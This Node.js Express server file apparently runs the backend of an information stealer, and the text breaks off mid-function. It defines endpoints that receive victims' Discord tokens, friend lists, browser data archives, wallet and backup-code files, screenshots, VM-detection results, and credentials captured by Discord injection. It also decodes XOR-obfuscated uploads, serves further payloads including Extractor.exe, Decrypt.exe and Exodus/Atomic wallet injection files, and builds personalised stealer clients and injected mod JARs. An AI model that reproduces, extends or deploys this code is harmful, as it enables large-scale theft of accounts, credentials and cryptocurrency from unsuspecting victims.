require('dotenv').config();
const express = require('express');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const bodyParser = require('body-parser');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const db = require('./db');
const { startPersonalizedBuild } = require('./build-runner');

const cookieParser = (cookieHeader) => {
    const list = {};
    if (!cookieHeader) return list;
    cookieHeader.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        list[parts.shift().trim()] = decodeURI(parts.join('='));
    });
    return list;
};

const app = express();
const PORT = process.env.PORT || 3000;
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const PAYLOADS_DIR = path.join(__dirname, 'payloads');
const SHARED_FILES_DIR = path.join(__dirname, 'shared-files');
const SHARED_FILES_TEMP_DIR = path.join(SHARED_FILES_DIR, 'temp');

// Ensure directories exist
fs.ensureDirSync(UPLOADS_DIR);
fs.ensureDirSync(PAYLOADS_DIR);
fs.ensureDirSync(SHARED_FILES_DIR);
fs.ensureDirSync(SHARED_FILES_TEMP_DIR);

// Environment configuration (all secrets must come from the environment)
function requireEnv(name) {
    const value = process.env[name];
    if (!value) {
        console.error(`Fatal: missing required environment variable ${name}. Set it in server/.env before starting.`);
        process.exit(1);
    }
    return value;
}

const ADMIN_PASSWORD = requireEnv('ADMIN_PASSWORD');
const API_KEY = requireEnv('API_KEY');
const SECRET_KEY = requireEnv('SECRET_KEY');

const ALLOWED_BUILD_IDS = process.env.ALLOWED_BUILD_IDS 
    ? process.env.ALLOWED_BUILD_IDS.split(',').map(id => id.trim()) 
    : null;

// Helper: Sanitize build ID for filesystem
function sanitizeBuildId(id) {
    return id.replace(/[^a-zA-Z0-9-_]/g, '_');
}

function sanitizeFilename(filename) {
    const parsed = path.parse(filename || 'file');
    const safeName = parsed.name.replace(/[^a-zA-Z0-9-_ ]/g, '_').trim() || 'file';
    const safeExt = parsed.ext.replace(/[^a-zA-Z0-9.]/g, '').slice(0, 20);
    return `${safeName}${safeExt}`;
}

async function getUniqueFilePath(dir, filename) {
    const cleanName = sanitizeFilename(filename);
    const parsed = path.parse(cleanName);
    let candidate = path.join(dir, cleanName);
    let counter = 1;

    while (await fs.pathExists(candidate)) {
        candidate = path.join(dir, `${parsed.name}-${counter}${parsed.ext}`);
        counter += 1;
    }

    return candidate;
}

async function listSharedFiles() {
    const entries = await fs.readdir(SHARED_FILES_DIR);
    const files = [];

    for (const entry of entries) {
        const filePath = path.join(SHARED_FILES_DIR, entry);
        const stat = await fs.stat(filePath);
        if (!stat.isFile()) continue;

        files.push({
            name: entry,
            size: stat.size,
            uploadedAt: stat.mtime.toISOString(),
            downloadUrl: `/shared-files/download/${encodeURIComponent(entry)}`
        });
    }

    return files.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt) || a.name.localeCompare(b.name));
}

// Helper: Get build directory path
function getBuildDir(buildId) {
    const safeId = sanitizeBuildId(buildId);
    const dir = path.join(UPLOADS_DIR, safeId);
    fs.ensureDirSync(dir);
    return dir;
}

// Helper: Initialize or update meta.json for a build
async function ensureBuildMeta(buildId, initialData = {}) {
    const buildDir = getBuildDir(buildId);
    const metaPath = path.join(buildDir, 'meta.json');
    
    if (!fs.existsSync(metaPath)) {
        const newMeta = {
            uuid: buildId,
            userId: buildId,
            timestamp: new Date().toISOString(),
            stats: {
                passwordcount: 0,
                cookiecount: 0,
                discordtokencount: 0,
                credentialcount: 0,
                screenshotcount: 0,
                filedropcount: 0,
                errorcount: 0,
                vmalerts: 0
            },
            data: {},
            files: [],
            ...initialData
        };
        fs.writeJsonSync(metaPath, newMeta);
        return newMeta;
    }
    return fs.readJsonSync(metaPath);
}

// Helper: Update stats in meta.json.
// statsKey/payload format: keys map directly to meta.stats counters. The
// read-modify-write is fully synchronous, so the event loop serializes
// concurrent updates and no increment can be lost.
function updateBuildStats(buildId, updates) {
    const buildDir = getBuildDir(buildId);
    const metaPath = path.join(buildDir, 'meta.json');
    if (!fs.existsSync(metaPath)) return;
    const meta = fs.readJsonSync(metaPath);
    if (!meta.stats) meta.stats = {};
    for (const [key, value] of Object.entries(updates)) {
        meta.stats[key] = (meta.stats[key] || 0) + value;
    }
    fs.writeJsonSync(metaPath, meta);
    bumpLogsCache();
}

// Strict component pattern for values that become filesystem path segments.
// Legacy exfil endpoints used raw headers (X-Session-ID / X-Trace-ID) as path
// segments, which permitted directory traversal writes. Reject anything that
// is not a plain token.
const SAFE_COMPONENT = /^[a-zA-Z0-9_-]{1,96}$/;
function isSafeComponent(value) {
    return typeof value === 'string' && SAFE_COMPONENT.test(value);
}

// Helper: Add file record to meta.json
function addBuildFile(buildId, filename) {
    const buildDir = getBuildDir(buildId);
    const metaPath = path.join(buildDir, 'meta.json');
    if (fs.existsSync(metaPath)) {
        const meta = fs.readJsonSync(metaPath);
        if (!meta.files.includes(filename)) {
            meta.files.push(filename);
            fs.writeJsonSync(metaPath, meta);
            bumpLogsCache();
        }
    }
}

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// JWT signing is separated from the symmetric XOR key used by the legacy
// /v2/data endpoint and by compiled clients. SECRET_KEY remains the payload
// obfuscation key; JWT_SECRET (when configured) signs tokens, so leaking the
// payload key does not expose the session-signing key.
const JWT_SECRET = process.env.JWT_SECRET || SECRET_KEY;

// Minimal in-memory rate limiter for authentication endpoints. Protects
// against credential brute-forcing without adding a dependency.
const authAttempts = new Map();
function rateLimitAuth(req, res, next) {
    const key = `${req.ip}:${req.path}`;
    const now = Date.now();
    const windowMs = 60000;
    const maxAttempts = 20;

    const record = authAttempts.get(key) || { count: 0, resetAt: now + windowMs };
    if (now > record.resetAt) {
        record.count = 0;
        record.resetAt = now + windowMs;
    }
    record.count += 1;
    authAttempts.set(key, record);

    if (record.count > maxAttempts) {
        return res.status(429).json({ error: 'Too many attempts. Try again later.' });
    }
    next();
}
setInterval(() => {
    const now = Date.now();
    for (const [key, record] of authAttempts) {
        if (now > record.resetAt) authAttempts.delete(key);
    }
}, 60000).unref();

// Authentication Middleware
const authenticateUser = (req, res, next) => {
    const skipPaths = [
        '/init', '/log_data', '/v2/data', '/log_files', '/p', '/exodus', '/atomic',
        '/login', '/login.html', '/register.html', '/api/auth/login', '/api/auth/register',
        '/discord', '/browser', '/files', '/log', '/antivm', '/err', '/capture', '/collect',
        '/Extractor.exe', '/Decrypt.exe'
    ];
    
    if (
        skipPaths.includes(req.path) ||
        req.path.startsWith('/api/payloads/download/') ||
        req.path.startsWith('/shared-files/download/') ||
        req.path.startsWith('/css/') ||
        req.path.startsWith('/js/') ||
        req.path === '/favicon.ico'
    ) {
        return next();
    }

    let token = null;
    if (req.headers.cookie) {
        const cookies = cookieParser(req.headers.cookie);
        token = cookies['auth_token'];
    }
    if (!token && req.headers['authorization']) {
        const parts = req.headers['authorization'].split(' ');
        if (parts.length === 2 && parts[0] === 'Bearer') {
            token = parts[1];
        } else {
            token = req.headers['authorization'];
        }
    }

    if (!token) {
        if (req.path === '/' || req.path === '/index.html') {
            return res.redirect('/login.html');
        }
        return res.status(401).json({ error: 'Unauthorized: No token provided' });
    }

    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
        next();
    } catch (err) {
        if (req.path === '/' || req.path === '/index.html') {
            return res.redirect('/login.html');
        }
        return res.status(401).json({ error: 'Unauthorized: Invalid token' });
    }
};

app.use(authenticateUser);

const requireAdmin = (req, res, next) => {
    if (!req.user || req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden: Admin role required' });
    }
    next();
};

// API Key middleware for exfiltration endpoints
const validateApiKey = async (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    const buildId = req.headers['x-build-id'];
    
    if (!apiKey || apiKey !== API_KEY) {
        return res.status(401).json({ error: 'Invalid or missing X-API-KEY' });
    }
    if (!buildId) {
        return res.status(400).json({ error: 'Missing X-BUILD-ID header' });
    }
    
    const safeBuildId = sanitizeBuildId(buildId);

    // Validate if the build exists in our database
    const dbBuild = await db.getBuild(safeBuildId);
    if (!dbBuild && safeBuildId.startsWith('user_')) {
        return res.status(403).json({ error: `Build ID ${buildId} not registered` });
    }
    
    if (ALLOWED_BUILD_IDS && !ALLOWED_BUILD_IDS.includes(safeBuildId) && !dbBuild) {
        return res.status(403).json({ error: `Build ID ${buildId} not allowed` });
    }
    
    req.buildId = safeBuildId;
    next();
};

// Apply API key middleware to exfiltration routes
app.use('/discord', validateApiKey);
app.use('/browser', validateApiKey);
app.use('/files', validateApiKey);
app.use('/log', validateApiKey);
app.use('/antivm', validateApiKey);
app.use('/err', validateApiKey);
app.use('/capture', validateApiKey);
app.use('/collect', validateApiKey);

// Multer config for file uploads (temp storage)
const upload = multer({ dest: path.join(UPLOADS_DIR, 'temp') });
const sharedUpload = multer({
    dest: SHARED_FILES_TEMP_DIR,
    limits: { fileSize: 100 * 1024 * 1024, files: 10 }
});

// ==================== EXISTING ENDPOINTS (Legacy) ====================
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/files', async (req, res) => {
    try {
        res.json(await listSharedFiles());
    } catch (err) {
        console.error('Error listing shared files:', err);
        res.status(500).json({ error: 'Unable to list files' });
    }
});

app.post('/api/files/upload', requireAdmin, sharedUpload.array('files', 10), async (req, res) => {
    try {
        const uploadedFiles = req.files || [];
        if (uploadedFiles.length === 0) {
            return res.status(400).json({ error: 'No files uploaded' });
        }

        for (const file of uploadedFiles) {
            const destination = await getUniqueFilePath(SHARED_FILES_DIR, file.originalname);
            await fs.move(file.path, destination, { overwrite: false });
        }

        res.status(201).json(await listSharedFiles());
    } catch (err) {
        console.error('Error uploading shared files:', err);
        res.status(500).json({ error: 'Unable to upload files' });
    }
});

app.get('/shared-files/download/:filename', async (req, res) => {
    const filename = sanitizeFilename(req.params.filename);
    const fullPath = path.join(SHARED_FILES_DIR, filename);
    const normalized = path.normalize(fullPath);

    if (!normalized.startsWith(SHARED_FILES_DIR + path.sep)) {
        return res.status(403).send('Forbidden');
    }

    if (await fs.pathExists(fullPath)) {
        return res.download(fullPath);
    }

    res.status(404).send('File not found');
});

app.get('/login', (req, res) => {
    res.redirect('/login.html');
});

// ==================== NEW AUTHENTICATION & BUILD ENDPOINTS ====================

app.post('/api/auth/register', rateLimitAuth, async (req, res) => {
    const { username, password, role, adminCode } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }

    try {
        const existing = await db.getUserByUsername(username);
        if (existing) {
            return res.status(400).json({ error: 'Username is already taken' });
        }

        let userRole = 'standard';
        if (role === 'admin') {
            if (adminCode !== ADMIN_PASSWORD) {
                await db.logAction(null, username, 'REGISTER', { role, error: 'Invalid admin code' }, 'FAILED');
                return res.status(403).json({ error: 'Invalid admin registration code' });
            }
            userRole = 'admin';
        }

        const user = await db.createUser(username, password, userRole);
        await db.logAction(user.id, username, 'REGISTER', { role: userRole }, 'SUCCESS');
        res.status(201).json({ status: 'ok', user });
    } catch (err) {
        console.error('Registration error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/auth/login', rateLimitAuth, async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }

    try {
        const user = await db.getUserByUsername(username);
        if (!user) {
            await db.logAction(null, username, 'LOGIN', { error: 'User not found' }, 'FAILED');
            return res.status(401).json({ error: 'Invalid username or password' });
        }

        const match = await bcrypt.compare(password, user.password);
        if (!match) {
            await db.logAction(user.id, username, 'LOGIN', { error: 'Incorrect password' }, 'FAILED');
            return res.status(401).json({ error: 'Invalid username or password' });
        }

        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        const secureFlag = (req.secure || req.headers['x-forwarded-proto'] === 'https') ? '; Secure' : '';
        res.setHeader('Set-Cookie', [
            `auth_token=${token}; Path=/; HttpOnly; Max-Age=86400; SameSite=Strict${secureFlag}`
        ]);

        await db.logAction(user.id, username, 'LOGIN', { role: user.role }, 'SUCCESS');
        res.json({ status: 'ok', user: { id: user.id, username: user.username, role: user.role } });
    } catch (err) {
        console.error('Login error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/api/auth/logout', async (req, res) => {
    if (req.user) {
        await db.logAction(req.user.id, req.user.username, 'LOGOUT', null, 'SUCCESS');
    }
    res.setHeader('Set-Cookie', [
        'auth_token=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; SameSite=Strict'
    ]);
    res.json({ status: 'ok' });
});

app.get('/api/auth/me', (req, res) => {
    let token = null;
    if (req.headers.cookie) {
        const cookies = cookieParser(req.headers.cookie);
        token = cookies['auth_token'];
    }
    if (!token && req.headers['authorization']) {
        const parts = req.headers['authorization'].split(' ');
        token = parts.length === 2 ? parts[1] : req.headers['authorization'];
    }

    if (!token) {
        return res.status(401).json({ error: 'Not authenticated' });
    }

    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        res.json(decoded);
    } catch (err) {
        res.status(401).json({ error: 'Invalid session' });
    }
});

app.post('/api/build/generate', async (req, res) => {
    try {
        const protocol = req.headers['x-forwarded-proto'] || req.protocol;
        const vpsHost = `${protocol}://${req.headers.host}`;
        
        const { jarFilename } = req.body;
        let sanitizedJarFilename = null;
        if (jarFilename) {
            sanitizedJarFilename = sanitizeFilename(jarFilename);
        }
        
        console.log(`[Build] Triggering build for user: ${req.user.username} (ID: ${req.user.id}) with custom JAR: ${sanitizedJarFilename || 'default'}`);
        
        const result = await startPersonalizedBuild(req.user.id, req.user.username, vpsHost, sanitizedJarFilename);
        res.json(result);
    } catch (err) {
        console.error('[Build Error]', err);
        // Do not leak absolute server paths or environment details to the client.
        res.status(500).json({ error: 'Build failed. Check server logs for details.' });
    }
});

app.get('/api/payloads/download/:userId/:filename', (req, res) => {
    const { userId, filename } = req.params;
    const safeUserId = userId.replace(/[^a-zA-Z0-9-_]/g, '');
    const safeFilename = filename.replace(/[^a-zA-Z0-9-_\.]/g, '');
    
    if (safeFilename !== 'client.exe' && safeFilename !== `injected_mod_user_${safeUserId}.jar`) {
        return res.status(400).send('Invalid file requested');
    }

    const filePath = path.resolve(__dirname, '..', 'builds', `user_${safeUserId}`, 'dist', safeFilename);
    
    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).send('Build file not found');
    }
});

app.get('/api/admin/action-logs', requireAdmin, async (req, res) => {
    try {
        const { action, status, search } = req.query;
        const logs = await db.listActionLogs({ action, status, search });
        res.json(logs);
    } catch (err) {
        console.error('Error fetching action logs:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/admin/action-logs/export', requireAdmin, async (req, res) => {
    try {
        const { format } = req.query;
        const logs = await db.listActionLogs();

        if (format === 'csv') {
            res.setHeader('Content-Type', 'text/csv');
            res.setHeader('Content-Disposition', 'attachment; filename=action_logs.csv');
            
            let csv = 'ID,User ID,Username,Action,Details,Status,Timestamp\n';
            logs.forEach(log => {
                const detailsStr = log.details ? log.details.replace(/"/g, '""') : '';
                csv += `"${log.id}","${log.userId || ''}","${log.username || ''}","${log.action}","${detailsStr}","${log.status}","${log.timestamp}"\n`;
            });
            return res.send(csv);
        }

        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', 'attachment; filename=action_logs.json');
        res.json(logs);
    } catch (err) {
        console.error('Error exporting logs:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Legacy multer storage for /log_files
const legacyStorage = multer.diskStorage({
    destination: (req, file, cb) => {
        const traceId = req.headers['x-session-id'] || req.headers['x-trace-id'] || 'unknown';
        // Reject anything that could traverse out of UPLOADS_DIR. The traceId
        // is attacker-controlled (unauthenticated legacy endpoint), so it must
        // match a strict token shape before it becomes a path segment.
        if (!isSafeComponent(traceId)) {
            return cb(Object.assign(new Error('Invalid session id'), { status: 400 }));
        }
        const dir = path.join(UPLOADS_DIR, traceId);
        fs.ensureDirSync(dir);
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});
const legacyUpload = multer({ storage: legacyStorage });

app.post('/init', (req, res) => {
    const userId = req.headers['x-user-identifier'] || req.headers['x-uid'] || 'unknown';
    const logUuid = crypto.randomUUID();
    
    const logInfo = {
        uuid: logUuid,
        userId: String(userId),
        timestamp: new Date().toISOString(),
        stats: req.body,
        data: {},
        files: []
    };
    
    const logPath = path.join(UPLOADS_DIR, logUuid);
    fs.ensureDirSync(logPath);
    fs.writeJsonSync(path.join(logPath, 'meta.json'), logInfo);
    bumpLogsCache();
    
    console.log(`[+] New legacy log created: ${logUuid} from User: ${userId}`);
    res.json({ log_uuid: logUuid });
});

app.post('/log_data', (req, res) => {
    const traceId = req.headers['x-trace-id'];
    if (!traceId || !isSafeComponent(traceId)) return res.status(400).send('Missing or invalid X-Trace-ID');
    
    const logPath = path.join(UPLOADS_DIR, traceId);
    if (!fs.existsSync(logPath)) return res.status(404).send('Log session not found');
    
    const metaPath = path.join(logPath, 'meta.json');
    const meta = fs.readJsonSync(metaPath);
    meta.data = req.body;
    fs.writeJsonSync(metaPath, meta);
    bumpLogsCache();
    
    console.log(`[+] Legacy data received for log: ${traceId}`);
    res.sendStatus(200);
});

app.get('/p', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    res.send(ip.replace('::ffff:', ''));
});

const xor = (data, key) => {
    const buffer = Buffer.from(data, 'base64');
    const result = Buffer.alloc(buffer.length);
    for (let i = 0; i < buffer.length; i++) {
        result[i] = buffer[i] ^ key.charCodeAt(i % key.length);
    }
    return result.toString();
};

app.post('/v2/data', (req, res) => {
    const traceId = req.headers['x-session-id'] || req.headers['x-trace-id'];
    const { payload } = req.body;
    
    if (!traceId || !isSafeComponent(traceId) || !payload) return res.status(400).send('Bad Request');
    
    try {
        const decryptedData = JSON.parse(xor(payload, SECRET_KEY));
        const logPath = path.join(UPLOADS_DIR, traceId);
        
        if (!fs.existsSync(logPath)) return res.status(404).send('Not Found');
        
        const metaPath = path.join(logPath, 'meta.json');
        const meta = fs.readJsonSync(metaPath);
        meta.data = decryptedData;
        fs.writeJsonSync(metaPath, meta);
        bumpLogsCache();
        
        console.log(`[+] Obfuscated data received for log: ${traceId}`);
        res.sendStatus(200);
    } catch (e) {
        console.error(`[-] Failed to decrypt payload: ${e.message}`);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/log_files', legacyUpload.single('file'), (req, res) => {
    const traceId = req.headers['x-session-id'] || req.headers['x-trace-id'];
    console.log(`[+] Legacy file received for log: ${traceId} -> ${req.file.originalname}`);
    res.sendStatus(200);
});

// Payload downloads (for client's downloadExtractor/downloadDecrypt)
app.get('/Extractor.exe', (req, res) => {
    const payloadPath = path.join(PAYLOADS_DIR, 'Extractor.exe');
    if (fs.existsSync(payloadPath)) {
        res.download(payloadPath);
    } else {
        res.status(404).send('Payload not found');
    }
});

app.get('/Decrypt.exe', (req, res) => {
    const payloadPath = path.join(PAYLOADS_DIR, 'Decrypt.exe');
    if (fs.existsSync(payloadPath)) {
        res.download(payloadPath);
    } else {
        res.status(404).send('Payload not found');
    }
});

// Legacy injection payloads
app.get('/exodus', (req, res) => {
    const payloadPath = path.join(PAYLOADS_DIR, 'exodus.asar');
    if (fs.existsSync(payloadPath)) {
        res.download(payloadPath);
    } else {
        res.status(404).send('Payload not found');
    }
});

app.get('/atomic', (req, res) => {
    const payloadPath = path.join(PAYLOADS_DIR, 'atomic.asar');
    if (fs.existsSync(payloadPath)) {
        res.download(payloadPath);
    } else {
        res.status(404).send('Payload not found');
    }
});

// ==================== NEW EXFILTRATION ENDPOINTS ====================

// POST /discord - Discord tokens, user info, friend list
app.post('/discord', async (req, res) => {
    try {
        const buildId = req.buildId;
        const { token, userInfo, friends } = req.body;
        
        await ensureBuildMeta(buildId);
        await db.insertEvent(buildId, 'discord', {
            timestamp: new Date().toISOString(),
            token,
            userInfo,
            friends
        });
        
        // Update stats
        updateBuildStats(buildId, { discordtokencount: 1 });
        
        console.log(`[+] Discord data received for build: ${buildId} (user: ${userInfo?.username || 'unknown'})`);
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Error processing /discord:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /browser - ZIP archive (browser data) + folder summary
app.post('/browser', upload.single('file'), async (req, res) => {
    try {
        const buildId = req.buildId;
        const summary = req.body.summary || '';
        const uploadedFile = req.file;
        
        if (!uploadedFile) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const buildDir = getBuildDir(buildId);
        const timestamp = Date.now();
        const zipFilename = `browser_data_${timestamp}.zip`;
        const summaryFilename = `browser_summary_${timestamp}.txt`;
        
        // Move uploaded file to build directory
        const finalZipPath = path.join(buildDir, zipFilename);
        await fs.move(uploadedFile.path, finalZipPath, { overwrite: true });
        
        // Save summary as text file
        fs.writeFileSync(path.join(buildDir, summaryFilename), summary);
        
        // Update meta
        await ensureBuildMeta(buildId);
        addBuildFile(buildId, zipFilename);
        addBuildFile(buildId, summaryFilename);
        updateBuildStats(buildId, { filedropcount: 1 });
        
        console.log(`[+] Browser data ZIP received for build: ${buildId} (${zipFilename})`);
        res.status(200).json({ status: 'ok', filename: zipFilename });
    } catch (err) {
        console.error('Error processing /browser:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /files - Wallets, backup codes, etc. (zip file + message)
app.post('/files', upload.single('file'), async (req, res) => {
    try {
        const buildId = req.buildId;
        const message = req.body.message || '';
        const uploadedFile = req.file;
        
        if (!uploadedFile) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const buildDir = getBuildDir(buildId);
        const timestamp = Date.now();
        const zipFilename = `files_data_${timestamp}.zip`;
        const messageFilename = `files_message_${timestamp}.txt`;
        
        // Move uploaded file to build directory
        const finalZipPath = path.join(buildDir, zipFilename);
        await fs.move(uploadedFile.path, finalZipPath, { overwrite: true });
        
        // Save message
        fs.writeFileSync(path.join(buildDir, messageFilename), message);
        
        await ensureBuildMeta(buildId);
        addBuildFile(buildId, zipFilename);
        addBuildFile(buildId, messageFilename);
        updateBuildStats(buildId, { filedropcount: 1 });
        
        console.log(`[+] Files ZIP received for build: ${buildId} (${zipFilename})`);
        res.status(200).json({ status: 'ok', filename: zipFilename });
    } catch (err) {
        console.error('Error processing /files:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /log - General status messages
app.post('/log', async (req, res) => {
    try {
        const buildId = req.buildId;
        const logMessage = req.body.message || req.body;
        
        await db.insertEvent(buildId, 'log', {
            timestamp: new Date().toISOString(),
            message: logMessage
        });
        
        console.log(`[+] Status log for build ${buildId}: ${logMessage}`);
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Error processing /log:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /antivm - VM detection results
app.post('/antivm', async (req, res) => {
    try {
        const buildId = req.buildId;
        const vmData = req.body.data || req.body;
        
        await db.insertEvent(buildId, 'antivm', {
            timestamp: new Date().toISOString(),
            ...vmData
        });
        
        // Update stats if VM detected
        if (vmData.isVM || vmData.detected === true) {
            updateBuildStats(buildId, { vmalerts: 1 });
        }
        
        console.log(`[+] VM detection for build ${buildId}: ${JSON.stringify(vmData)}`);
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Error processing /antivm:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /err - Error reports
app.post('/err', async (req, res) => {
    try {
        const buildId = req.buildId;
        const errorData = req.body;
        
        await db.insertEvent(buildId, 'err', {
            timestamp: new Date().toISOString(),
            ...errorData
        });
        
        updateBuildStats(buildId, { errorcount: 1 });
        
        console.log(`[+] Error report from build ${buildId}: ${errorData.message || 'Unknown error'}`);
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Error processing /err:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /capture - Base64-encoded screenshot (client sends { buildId, image })
app.post('/capture', async (req, res) => {
    try {
        const buildId = req.buildId;
        const { image } = req.body;
        
        if (!image) {
            return res.status(400).json({ error: 'Missing image data' });
        }
        
        // Remove possible data URL prefix if present (client sends raw base64)
        let base64Data = image;
        if (image.startsWith('data:image')) {
            base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        }
        
        const imageBuffer = Buffer.from(base64Data, 'base64');
        
        const buildDir = getBuildDir(buildId);
        const screenshotsDir = path.join(buildDir, 'screenshots');
        fs.ensureDirSync(screenshotsDir);
        
        const filename = `screenshot_${Date.now()}.png`;
        const filepath = path.join(screenshotsDir, filename);
        fs.writeFileSync(filepath, imageBuffer);
        
        addBuildFile(buildId, `screenshots/${filename}`);
        updateBuildStats(buildId, { screenshotcount: 1 });
        
        console.log(`[+] Screenshot saved for build ${buildId}: ${filename}`);
        res.status(200).json({ status: 'ok', filename });
    } catch (err) {
        console.error('Error processing /capture:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// POST /collect - Credentials intercepted via Discord injection
app.post('/collect', async (req, res) => {
    try {
        const buildId = req.buildId;
        const payload = req.body;  // { type, data, timestamp, buildId, user }
        
        await db.insertEvent(buildId, 'collect', {
            received_at: new Date().toISOString(),
            ...payload
        });
        
        // Update stats - count credentials (each POST could contain multiple credentials)
        updateBuildStats(buildId, { credentialcount: 1 });
        
        console.log(`[+] Credentials collected from build ${buildId} (type: ${payload.type || 'unknown'})`);
        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error('Error processing /collect:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ==================== DASHBOARD API ====================

// /api/logs previously did a fully synchronous recursive stat of every build
// directory on every request, stalling the event loop on large uploads trees.
// The scan is now async and memoized with a short TTL; any exfil write bumps a
// mtime marker so fresh data is visible within a second without staleness.
const logsCache = { data: null, at: 0, marker: 0 };
const LOGS_CACHE_TTL_MS = 1000;
let logsCacheMarker = 0;
// Bump whenever a build gains meta.json state or files so the next /api/logs
// re-scans instead of serving the memoized snapshot.
function bumpLogsCache() {
    logsCacheMarker += 1;
}

const getAllFiles = async (dirPath, relativePath = '') => {
    const out = [];
    let items;
    try {
        items = await fs.readdir(dirPath);
    } catch {
        return out;
    }
    for (const item of items) {
        const fullPath = path.join(dirPath, item);
        const relPath = relativePath ? path.join(relativePath, item) : item;
        let stat;
        try {
            stat = await fs.stat(fullPath);
        } catch {
            continue;
        }
        if (stat.isDirectory()) {
            out.push(...(await getAllFiles(fullPath, relPath)));
        } else if (item !== 'meta.json') {
            out.push({ relPath, mtimeMs: stat.mtimeMs });
        }
    }
    return out;
};

app.get('/api/logs', async (req, res) => {
    try {
        const now = Date.now();
        if (
            logsCache.data &&
            now - logsCache.at < LOGS_CACHE_TTL_MS &&
            logsCache.marker === logsCacheMarker
        ) {
            return res.json(logsCache.data);
        }

        const logs = [];
        const userDir = `user_${req.user.id}`;

        let dirs = [];
        if (req.user.role === 'admin') {
            dirs = await fs.readdir(UPLOADS_DIR);
        } else {
            dirs = await fs.pathExists(path.join(UPLOADS_DIR, userDir)) ? [userDir] : [];
        }

        for (const dir of dirs) {
            const logDir = path.join(UPLOADS_DIR, dir);
            try {
                const stat = await fs.stat(logDir);
                if (!stat.isDirectory()) continue;

                const metaPath = path.join(logDir, 'meta.json');
                let meta = {};
                if (await fs.pathExists(metaPath)) {
                    meta = fs.readJsonSync(metaPath);
                } else {
                    meta = {
                        uuid: dir,
                        userId: dir,
                        timestamp: stat.birthtime.toISOString(),
                        stats: {
                            passwordcount: 0,
                            cookiecount: 0,
                            discordtokencount: 0,
                            credentialcount: 0,
                            screenshotcount: 0,
                            filedropcount: 0,
                            errorcount: 0,
                            vmalerts: 0
                        },
                        data: {}
                    };
                }

                const files = await getAllFiles(logDir);
                meta.actualFiles = files
                    .map(f => f.relPath)
                    .sort((a, b) => {
                        const af = files.find(x => x.relPath === a);
                        const bf = files.find(x => x.relPath === b);
                        return (bf?.mtimeMs || 0) - (af?.mtimeMs || 0) || a.localeCompare(b);
                    });

                // Attach recent exfil events from SQLite for the detail view.
                try {
                    const events = await db.listEvents(dir);
                    meta.events = events.slice(-50).map(e => ({
                        id: e.id,
                        type: e.type,
                        createdAt: e.createdAt,
                        data: JSON.parse(e.data || '{}')
                    }));
                } catch (err) {
                    console.error(`Error loading events for ${dir}:`, err);
                    meta.events = [];
                }

                logs.push(meta);
            } catch (err) {
                console.error(`Error loading log folder ${dir}:`, err);
            }
        }

        logs.sort((a, b) => {
            const aTime = Date.parse(a.timestamp || 0) || 0;
            const bTime = Date.parse(b.timestamp || 0) || 0;
            return bTime - aTime || String(a.uuid || '').localeCompare(String(b.uuid || ''));
        });

        logsCache.data = logs;
        logsCache.at = now;
        logsCache.marker = logsCacheMarker;
        res.json(logs);
    } catch (err) {
        console.error('Error scanning logs:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/api/download/:uuid/*filepath', (req, res) => {
    const uuid = req.params.uuid;
    
    if (req.user.role !== 'admin' && uuid !== `user_${req.user.id}`) {
        return res.status(403).send('Forbidden: Access denied to this log directory');
    }

    const filepath = Array.isArray(req.params.filepath)
        ? req.params.filepath.join('/')
        : req.params.filepath;
    const fullPath = path.join(UPLOADS_DIR, uuid, filepath);
    
    // Ensure the resolved file stays strictly inside the uploads tree. A bare
    // startsWith(UPLOADS_DIR) would also accept sibling directories whose name
    // merely shares the prefix (e.g. "/path/uploads_evil"), so require the
    // trailing separator.
    const uploadsPrefix = UPLOADS_DIR.endsWith(path.sep) ? UPLOADS_DIR : UPLOADS_DIR + path.sep;
    const normalized = path.normalize(fullPath);
    if (!normalized.startsWith(uploadsPrefix)) {
